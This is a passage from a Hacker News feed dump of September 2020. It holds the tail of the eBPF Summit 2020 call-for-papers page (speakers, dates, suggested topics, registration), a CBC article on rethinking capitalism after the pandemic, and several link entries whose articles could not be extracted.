Gregg</h3><div><p>Author of ‚ÄúBPF Performance Tools‚Äú,</p><p>Lead Performance Engineer,</p><p>Netflix</p></div></div><div><p><img src="https://ebpf.io/static/daniel-borkmann-ad8ea1cea4487752aee473cdfeab64db.png" alt="Daniel Borkmann"></p><h3>Daniel Borkmann</h3><div><p>Co-maintainer eBPF,</p><p>Isovalent</p></div></div><div><p><img src="https://ebpf.io/static/david-miller-472d128f44319f988ddbdba9bd0b2898.png" alt="David Miller"></p><h3>David Miller</h3><div><p>Linux Kernel Networking Maintainer,</p><p>Red Hat</p></div></div><div><p><img src="https://ebpf.io/static/kris-nova-64d0ee6f9b5fcc0b94bec82140b99699.png" alt="Kris Nova"></p><h3>Kris Nova</h3><div><p>Chief Open Source Advocate,</p><p>Sysdig</p></div></div><div><p><img src="https://ebpf.io/static/kp-singh-1d454c6f8fee13c6fd90163f291b50b1.png" alt="KP Singh"></p><h3>KP Singh</h3><div><p>Kernel Runtime Security,</p><p>Google</p></div></div><div><p><img src="https://ebpf.io/static/laurent-bernaille-696ad3565b2ed182fd170a366c058d08.png" alt="Laurent Bernaille"></p><h3>Laurent Bernaille</h3></div><div><p><img src="https://ebpf.io/static/liz-rice-6b8760303d3ddf1923cb7d34f3d0bb2d.png" alt="Liz Rice"></p><h3>Liz Rice</h3><div><p>VP, Open Source Engineering,</p><p>Aqua</p></div></div><div><p><img src="https://ebpf.io/static/tomas-graf-607005c54b9411446b9574ae0f7fb082.png" alt="Tomas Graf"></p><h3>Tomas Graf</h3><div><p>Co-founder of the Cilium Project,</p><p>Isovalent</p></div></div><div><p><img src="data:image/png;base64,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" alt="Zang Li"></p><h3>Zang Li</h3><div><p>Cilium Core Team Maintainer,</p><p>Google</p></div></div></div></div><div><div><div><h2>eBPF User Lightning Talks</h2><p>Users are invited to submit talks describing how they are using eBPF and eBPF-based open source projects to solve real world problems. To be clear, you do not have to be writing raw eBPF programs yourself to speak, we expect many speakers to be leveraging eBPF via derivative projects (see list <a href="https://ebpf.io/projects">here</a>). Lightning talks will be 5 minutes in length (plus time for Q&amp;A) and can be pre-recorded or delivered live based on the speaker‚Äôs preference. We do ask that regardless of the delivery that the speaker is present to answer questions and interact with the community.</p></div><div><h2>Dates to Remember</h2><div><h4>CFP Opens: </h4><p>Wednesday, September 23</p><h4>Registration opens:</h4><p>Wednesday, September 23</p><h4>CFP Closes: </h4><p>Wednesday, October 14 at 11:59 <strong>PDT</strong></p><h4>CFP Notifications: </h4><p>on or before Friday, October 16</p><h4>Session Recordings Completed: </h4><p>Sunday, October 25th at 11:59 <strong>PDT</strong></p><h4>Event Date:</h4><p>October 28 and 29th, 2020,<br>9am-12pm <strong>PDT</strong> / 4pm-7pm <strong>GMT</strong></p></div></div></div><div><div><h2>Suggested Topics</h2><ul><li>Using eBPF to troubleshoot application and system performance</li><li>Applying eBPF to implement zero trust, runtime security, network policy</li><li>Tackling infrastructure scalability challenges with eBPF</li><li>Applying eBPF to networking and load-balancing</li><li>Application profiling and tracing with eBPF</li><li>System and application monitoring with eBPF</li><li>Unlocking new levels of observability with eBPF</li><li>Advancements in the eBPF core infrastructure and libraries</li><li>eBPF community related topics</li></ul></div><div><h2>Registration</h2><p>The summit is open to everyone free of charge. To sign up for the event, please fill out this <a href="https://docs.google.com/forms/d/e/1FAIpQLSeWBrtQzSDxgFb2yMoa2tePapMibKeGaHLHDd70xNJzzVMX5g/viewform?embedded=true">Registration Form</a>. You will receive information on how to join the summit prior to the event.</p><p>If you have any questions please ask them on <a href="https://cilium.herokuapp.com/">the eBPF Slack</a>. There is a #ebpf-summit channel dedicated for this event.</p></div></div></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://ebpf.io/ebpf-summit-2020-cfp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577647</guid>
            <pubDate>Thu, 24 Sep 2020 11:48:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Polis: real-time system for gathering, analyzing and understanding large groups]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577640">thread link</a>) | @searchableguy
<br/>
September 24, 2020 | https://pol.is/home | <a href="https://web.archive.org/web/*/https://pol.is/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://pol.is/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577640</guid>
            <pubDate>Thu, 24 Sep 2020 11:47:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compasses [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577592">thread link</a>) | @082349872349872
<br/>
September 24, 2020 | http://sync.abue.io/issues/190705ap_sync2_27_compasses.pdf | <a href="https://web.archive.org/web/*/http://sync.abue.io/issues/190705ap_sync2_27_compasses.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://sync.abue.io/issues/190705ap_sync2_27_compasses.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577592</guid>
            <pubDate>Thu, 24 Sep 2020 11:41:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Dark: Looking for the End of the Internet, Part 3: The Gemini Project]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577554">thread link</a>) | @sT370ma2
<br/>
September 24, 2020 | https://cheapskatesguide.org/articles/gemini.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/gemini.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/gemini.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577554</guid>
            <pubDate>Thu, 24 Sep 2020 11:35:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pandemic recovery will require rethinking capitalist norms, expert says]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577476">thread link</a>) | @pseudolus
<br/>
September 24, 2020 | https://www.cbc.ca/radio/spark/pandemic-uncertainty-may-actually-be-good-for-your-brain-neuroscientist-explains-1.5729572/pandemic-recovery-will-require-rethinking-capitalist-norms-expert-says-1.5729646 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/spark/pandemic-uncertainty-may-actually-be-good-for-your-brain-neuroscientist-explains-1.5729572/pandemic-recovery-will-require-rethinking-capitalist-norms-expert-says-1.5729646">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Rather than planning COVID-19 economic recoveries around old capitalist norms, one business-world advisor believes that global enterprises need to take steps to re-invent their approach to capitalism by taking steps to combat growing inequality.&nbsp;</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.4827731.1537238348!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/frontpagetapestrycapitalism.jpg"></p></div><figcaption>Money might make the world go round, but one expert believes it's possible to ensure profit while maintaining social responsibility. <!-- --> </figcaption></figure><p><span></span><span>Listen</span><span>25:01</span></p><p><span><p>Rather than planning COVID-19 economic recoveries around old capitalist norms, one business advisor believes that global enterprises need to re-invent their approach to capitalism by taking steps to combat growing inequality.&nbsp;</p>  <p>"Recent research actually shows that whatever wealth was created in the last 12 months went to the top one per cent of Americans, for example," said Navi Radjou, an innovation and leadership advisor based in New York City, during an interview with <em>Spark</em> host Nora Young. "This is why I think we have to ask ourselves ‚Ä¶ what is normal? If the normal is actually dysfunctional, why are we trying to resuscitate a sick patient?"&nbsp;</p>  <p>As Radjou sees it, capitalism has created widespread social inequality and contributed to considerable environmental degradation through the effects of human-induced climate change, as well as through the economic and social system's emphasis on short-term gains and individualistic competition.</p>  <p>"It's about winning all the time," he said. "And the notion of cooperation, you rarely hear in corporate America. It's always about competing and winning."&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/spark-navi-radjou.jpg 300w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/spark-navi-radjou.jpg 460w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/spark-navi-radjou.jpg 620w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/spark-navi-radjou.jpg 780w,https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/spark-navi-radjou.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5729668.1600445124!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/spark-navi-radjou.jpg"></p></div><figcaption>Innovation and leadership advisor Navi Radjou says some companies are already rethinking their approach to conventional capitalism.<!-- --> <!-- -->(Submitted by Navi Radjou)</figcaption></figure></span></p>  <p>Radjou acknowledged that capitalism has enabled increases in overall comfort of living and has also contributed to increases in material prosperity across the world, but he said capitalist reforms need to centre around the creation of a "sense of purpose."</p>  <p>"Right now, the purpose is just about making money," he said. "Instead of that, we should broaden the scope of capitalism and say ‚Ä¶ we could simultaneously create economic value and we can create social value and we can create ecological value as well."</p>  <p>According to Radjou, companies like the European multinational food conglomerate Danone ‚Äî as well as smaller companies, like U.S-based commercial flooring giant Interface ‚Äî are among those that have already taken steps to maintain their existing capitalist leanings, while simultaneously attempting to improve their social impact.&nbsp;</p>  <p>"People call it conscious capitalism or regenerative capitalism," he said.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_300/hi-danoneyogurt-852-8col.jpg 300w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_460/hi-danoneyogurt-852-8col.jpg 460w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_620/hi-danoneyogurt-852-8col.jpg 620w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_780/hi-danoneyogurt-852-8col.jpg 780w,https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_1180/hi-danoneyogurt-852-8col.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.1897809.1380860185!/httpImage/image.jpg_gen/derivatives/original_780/hi-danoneyogurt-852-8col.jpg"></p></div><figcaption>Known for its line of dairy products, European food giant Danone is also drawing attention for its sustainable environmental and economic practices. <!-- --> <!-- -->(Radio-Canada)</figcaption></figure></span></p>  <p>Danone, Radjou pointed out, invests in regenerative agriculture, which enables the company's U.S. farmers to "enrich their soil, preserve biodiversity, as well as improve animal welfare," all while signing fixed, long-term contracts that maintain a steady income for the company's producers.&nbsp;</p>  <p>"This is an approach that Danone has been using for the last couple of years," he said.</p>  <p>Interface, according to Radjou, has spent the last two decades taking steps to reduce the company's overall carbon footprint and is even working on launching new carbon negative carpet tiles.&nbsp;</p>  <h2>Possible to increase profit while increasing positive social impacts</h2>  <p>While some might argue that companies need to maintain existing capitalist structures to ensure continued material prosperity, Radjou argued that it's actually in a company's best economic interest to adhere to <a href="https://sloanreview.mit.edu/article/the-rising-frugal-economy/" target="_blank">frugal economic principles</a>.</p>  <p>"The frugal economy essentially is an economy that reduces the huge gap that exists right now between supply and demand along four dimensions: Time, distance, trust and values," he said.&nbsp;</p>  <p>In effect, by reducing the gap between supply and demand, not only are companies able to save on costs, they're also able to better service consumers ‚Äî especially the section of consumers that Radjou calls "value and values conscious."</p>  <p><span><span><iframe src="https://www.youtube.com/embed/H5kORRhmM10" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>"Especially millennials [and] Gen Z, who are now almost 40 to 50 per cent of the global consumer-base, they're essentially voting with their [wallets]," he said. "They are actually asking for brands that are actually socially and environmentally conscious. So they are willing to even pay extra for those brands that have strong social and environmental credentials."&nbsp;</p>  <p>Though it might seem utopian, Radjou said he's hopeful because of changes he's seeing in global consumers, as well as the investor community, who are slowly demanding more responsible business practices.&nbsp;</p>  <p>"Even in some cases some shareholder communities ‚Ä¶ are putting pressure on companies to do the right thing for society and the planet."</p>    <p>At the same time, Radjou said even some government institutions ‚Äî like those in Europe ‚Äî are "heaping" pressure on companies to take steps to be more socially conscious.&nbsp;</p>  <p>"All studies show that if companies invest in societal and ecological [initiatives], it has a direct impact on [a company's] bottom line and the top line," he said.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/spark/pandemic-uncertainty-may-actually-be-good-for-your-brain-neuroscientist-explains-1.5729572/pandemic-recovery-will-require-rethinking-capitalist-norms-expert-says-1.5729646</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577476</guid>
            <pubDate>Thu, 24 Sep 2020 11:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smart Cow Collars]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24577468">thread link</a>) | @troydavis
<br/>
September 24, 2020 | https://halterhq.com/smart-cow-collars | <a href="https://web.archive.org/web/*/https://halterhq.com/smart-cow-collars">archive.org</a>
